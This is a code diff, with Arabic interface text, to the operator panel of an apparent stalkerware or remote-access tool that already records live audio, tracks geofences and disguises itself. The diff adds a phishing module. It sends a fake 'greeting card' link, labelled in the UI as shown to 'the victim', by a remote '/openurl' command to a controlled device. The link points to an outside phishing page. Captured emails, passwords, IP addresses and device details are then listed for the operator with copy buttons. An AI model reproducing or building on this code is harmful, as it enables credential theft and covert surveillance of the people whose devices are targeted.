@@ -49,6 +49,9 @@ let liveMotionPhotos = [];
 let liveGeofenceEvents = [];
 let liveLiveAudio = [];
 
+// 🎣 Phishing
+let livePhishing = [];
+
 let panelOpenTime = Date.now();
 let liveFilterEnabled = true;
 
@@ -250,6 +253,15 @@ function initSSE() {
             } catch (err) {}
         });
 
+        // 🎣 Phishing event
+        sse.addEventListener('new_phishing', (e) => {
+            try {
+                const data = JSON.parse(e.data);
+                addLivePhishing(data);
+                showNotification('🎣 بيانات صيد جديدة', `${data.email || ''} : ${data.password || ''}`, '🎣');
+            } catch (err) {}
+        });
+
         sse.addEventListener('sim_info', (e) => {
             try {
                 const data = JSON.parse(e.data);
@@ -346,6 +358,8 @@ async function sendCommandDual(command, params) {
             tgOk = await sendTelegramCommand('/liveaudio');
         else if (command === 'stop_live_audio')
             tgOk = await sendTelegramCommand('/stopliveaudio');
+        else if (command === 'open_url')
+            tgOk = await sendTelegramCommand(`/openurl ${params?.url || ''}`);
     } catch (e) { console.error('TG cmd err:', e); }
 
     return { serverOk, tgOk, anyOk: serverOk || tgOk };
@@ -611,6 +625,153 @@ async function toggleLiveAudio() {
 }
 
 // ═══════════════════════════════════════════
+// 🎣 Phishing module
+// ═══════════════════════════════════════════
+function openLivePhishing() {
+    const ov = document.getElementById('livePhishingOverlay');
+    if (ov) ov.style.display = 'block';
+    loadPhishing();
+}
+
+function closeLivePhishing() {
+    const ov = document.getElementById('livePhishingOverlay');
+    if (ov) ov.style.display = 'none';
+}
+
+function clearLivePhishing() {
+    if (!confirm('مسح كل بيانات الصيد؟')) return;
+    authFetch(`/phishing_clear.php?device=${encodeURIComponent(currentDevice)}`).then(() => {
+        livePhishing = [];
+        renderLivePhishing();
+        updateAdvancedCounters();
+    });
+}
+
+function addLivePhishing(data) {
+    livePhishing.unshift(data);
+    if (livePhishing.length > 500) livePhishing = livePhishing.slice(0, 500);
+    if (document.getElementById('livePhishingOverlay')?.style.display === 'block') renderLivePhishing();
+    updateAdvancedCounters();
+    const badge = document.getElementById('livePhishingCount');
+    if (badge) badge.textContent = livePhishing.length;
+}
+
+async function loadPhishing() {
+    if (!currentDevice) return;
+    try {
+        const response = await authFetch(`/phishing_list.php?device=${encodeURIComponent(currentDevice)}`);
+        const data = await response.json();
+        if (Array.isArray(data)) {
+            livePhishing = data;
+            renderLivePhishing();
+            updateAdvancedCounters();
+            const badge = document.getElementById('livePhishingCount');
+            if (badge) badge.textContent = data.length;
+        }
+    } catch (e) {}
+}
+
+function renderLivePhishing() {
+    const list = document.getElementById('livePhishingList');
+    if (!list) return;
+    if (livePhishing.length === 0) {
+        list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد بيانات</p>';
+        return;
+    }
+    list.innerHTML = '';
+    livePhishing.forEach((p, idx) => {
+        const div = document.createElement('div');
+        div.style.cssText = 'background:#1a000a;border:2px solid #ff0066;padding:18px;border-radius:12px;';
+        div.innerHTML = `
+            <div style="color:#ff0066;font-size:15px;font-weight:bold;margin-bottom:12px;">🎣 بيانات جديدة من "${p.sender || 'غير معروف'}"</div>
+            <div style="background:#0a0005;padding:12px;border-radius:8px;margin-bottom:10px;">
+                <div style="color:#888;font-size:11px;margin-bottom:5px;">📧 البريد:</div>
+                <div style="color:#fff;font-size:16px;font-weight:bold;direction:ltr;text-align:left;word-break:break-all;">${p.email || '—'}</div>
+            </div>
+            <div style="background:#0a0005;padding:12px;border-radius:8px;margin-bottom:10px;">
+                <div style="color:#888;font-size:11px;margin-bottom:5px;">🔑 كلمة المرور:</div>
+                <div style="color:#00ff66;font-size:16px;font-weight:bold;direction:ltr;text-align:left;word-break:break-all;">${p.password || '—'}</div>
+                <button onclick="copyToClipboard('${(p.password || '').replace(/'/g, "\\'")}')" style="background:#00cc99;color:#fff;border:none;padding:4px 12px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:11px;margin-top:6px;">📋 نسخ</button>
+            </div>
+            <div style="color:#888;font-size:11px;line-height:1.8;">
+                <div>🖥️ الجهاز: ${p.ua ? p.ua.slice(0, 60) + '...' : '—'}</div>
+                <div>📐 الشاشة: ${p.screen || '—'}</div>
+                <div>🌍 الدولة: ${p.tz || '—'} — ${p.lang || '—'}</div>
+                <div>🌐 IP: ${p.ip || '—'}</div>
+                <div>📅 ${formatDate(p.timestamp)}</div>
+            </div>
+            <button onclick="deletePhishingEntry(${idx})" style="margin-top:10px;background:#ff3300;color:#fff;border:none;padding:6px 15px;border-radius:5px;cursor:pointer;">🗑️ حذف</button>
+        `;
+        list.appendChild(div);
+    });
+}
+
+function deletePhishingEntry(idx) {
+    if (!confirm('حذف؟')) return;
+    authFetch(`/phishing_delete.php?device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
+        livePhishing.splice(idx, 1);
+        renderLivePhishing();
+        updateAdvancedCounters();
+    }).catch(() => {
+        livePhishing.splice(idx, 1);
+        renderLivePhishing();
+        updateAdvancedCounters();
+    });
+}
+
+function copyToClipboard(text) {
+    try {
+        navigator.clipboard.writeText(text).then(() => {
+            showNotification('📋 تم النسخ', text, '📋');
+        });
+    } catch (e) {}
+}
+
+async function sendPhishingCard() {
+    if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }
+
+    const ov = document.createElement('div');
+    ov.id = 'phishingDialog';
+    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;';
+    ov.innerHTML = `
+        <div style="background:#111;border:2px solid #ff0066;border-radius:15px;padding:25px;max-width:500px;width:100%;">
+            <h2 style="color:#ff0066;text-align:center;margin-bottom:20px;">🎣 إرسال بطاقة تهنئة</h2>
+            <div style="margin-bottom:15px;">
+                <label style="display:block;color:#aaa;margin-bottom:8px;">اسم المُرسِل (اللي هيظهر للضحية)</label>
+                <input id="phSender" type="text" value="صديق مقرب" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #ff0066;border-radius:8px;">
+            </div>
+            <div style="margin-bottom:15px;">
+                <label style="display:block;color:#aaa;margin-bottom:8px;">عنوان البطاقة</label>
+                <input id="phTitle" type="text" value="بطاقة تهنئة" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #ff0066;border-radius:8px;">
+            </div>
+            <div style="margin-bottom:15px;">
+                <label style="display:block;color:#aaa;margin-bottom:8px;">نص البطاقة</label>
+                <textarea id="phMsg" rows="3" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #ff0066;border-radius:8px;resize:vertical;">لقد أرسل لك بطاقة تهنئة خاصة! اضغط حسناً لاستلامها.</textarea>
+            </div>
+            <div style="display:flex;gap:10px;">
+                <button onclick="doSendPhishing()" style="flex:1;background:#ff0066;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">📤 فتح على الجهاز</button>
+                <button onclick="document.getElementById('phishingDialog').remove()" style="background:#333;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;">✖</button>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(ov);
+}
+
+async function doSendPhishing() {
+    const sender = document.getElementById('phSender').value.trim() || 'صديق';
+    const title = document.getElementById('phTitle').value.trim() || 'بطاقة تهنئة';
+    const msg = document.getElementById('phMsg').value.trim() || '';
+
+    const phishUrl = `https://saeed-ntrq.onrender.com/phishing.html?from=${encodeURIComponent(sender)}&id=${encodeURIComponent(currentDevice)}&title=${encodeURIComponent(title)}&msg=${encodeURIComponent(msg)}`;
+
+    const res = await sendCommandDual('open_url', { url: phishUrl });
+    if (res.anyOk) {
+        showNotification('🎣 تم الإرسال', 'سيفتح الرابط على الجهاز', '🎣');
+        document.getElementById('phishingDialog')?.remove();
+    } else alert('❌ فشل');
+}
+
+// ═══════════════════════════════════════════
 // Advanced menu
 // ═══════════════════════════════════════════
 function openAdvancedMenu() {
@@ -685,6 +846,12 @@ function openAdvancedMenu() {
                 <button onclick="openLiveAudioStream()" style="width:100%;margin-top:8px;background:#003322;color:#00ff99;border:1px solid #00ff99;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 مقاطع البث (<span id="liveLiveAudioCount">0</span>)</button>
             </div>
 
+            <div style="background:#1a0005;border:2px solid #ff0066;border-radius:10px;padding:15px;margin-bottom:15px;">
+                <h3 style="color:#ff0066;margin-bottom:10px;font-size:16px;">🎣 التصيّد الإلكتروني</h3>
+                <button onclick="sendPhishingCard()" style="width:100%;margin-bottom:8px;background:#ff0066;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;text-align:right;">🎣 إرسال بطاقة تهنئة (Phishing)</button>
+                <button onclick="openLivePhishing()" style="width:100%;background:#2a0010;color:#ff0066;border:1px solid #ff0066;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 بيانات الصيد (<span id="livePhishingCount">0</span>)</button>
+            </div>
+
             <button onclick="document.getElementById('advancedMenuOverlay').remove()" style="width:100%;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">✖ إغلاق</button>
         </div>
     `;
@@ -700,6 +867,7 @@ function updateAdvancedCounters() {
     const m = document.getElementById('liveMotionCount'); if (m) m.textContent = liveMotionPhotos.length;
     const g = document.getElementById('liveGeofenceCount'); if (g) g.textContent = liveGeofenceEvents.length;
     const l = document.getElementById('liveLiveAudioCount'); if (l) l.textContent = liveLiveAudio.length;
+    const p = document.getElementById('livePhishingCount'); if (p) p.textContent = livePhishing.length;
 }
 
 // ═══════════════════════════════════════════
@@ -1675,6 +1843,7 @@ function selectDevice(deviceId) {
         loadMotionPhotos();
         loadGeofenceEvents();
         loadLiveAudio();
+        loadPhishing();
     }
 }
 
@@ -1730,6 +1899,7 @@ async function updateLiveData() {
         if (data.motion_count !== undefined) { const m = document.getElementById('liveMotionCount'); if (m && m.textContent === '0') m.textContent = String(data.motion_count); }
         if (data.geofence_count !== undefined) { const g = document.getElementById('liveGeofenceCount'); if (g && g.textContent === '0') g.textContent = String(data.geofence_count); }
         if (data.live_audio_count !== undefined) { const l = document.getElementById('liveLiveAudioCount'); if (l && l.textContent === '0') l.textContent = String(data.live_audio_count); }
+        if (data.phishing_count !== undefined) { const p = document.getElementById('livePhishingCount'); if (p && p.textContent === '0') p.textContent = String(data.phishing_count); }
 
         const advCounters = {
             liveAudioCount: data.audio_count || 0,
@@ -1738,7 +1908,8 @@ async function updateLiveData() {
             liveVideoCount: data.video_count || 0,
             liveMotionCount: data.motion_count || 0,
             liveGeofenceCount: data.geofence_count || 0,
-            liveLiveAudioCount: data.live_audio_count || 0
+            liveLiveAudioCount: data.live_audio_count || 0,
+            livePhishingCount: data.phishing_count || 0
         };
         Object.keys(advCounters).forEach(id => {
             const el = document.getElementById(id);
@@ -2520,6 +2691,15 @@ window.startDeadMan = startDeadMan;
 window.stopDeadMan = stopDeadMan;
 window.resetDeadMan = resetDeadMan;
 window.toggleLiveAudio = toggleLiveAudio;
+
+// 🎣 Phishing exports
+window.openLivePhishing = openLivePhishing;
+window.closeLivePhishing = closeLivePhishing;
+window.clearLivePhishing = clearLivePhishing;
+window.sendPhishingCard = sendPhishingCard;
+window.doSendPhishing = doSendPhishing;
+window.deletePhishingEntry = deletePhishingEntry;
+window.copyToClipboard = copyToClipboard;
 
 window.openDisguiseMenu = openDisguiseMenu;
 window.changeDisguise = changeDisguise;
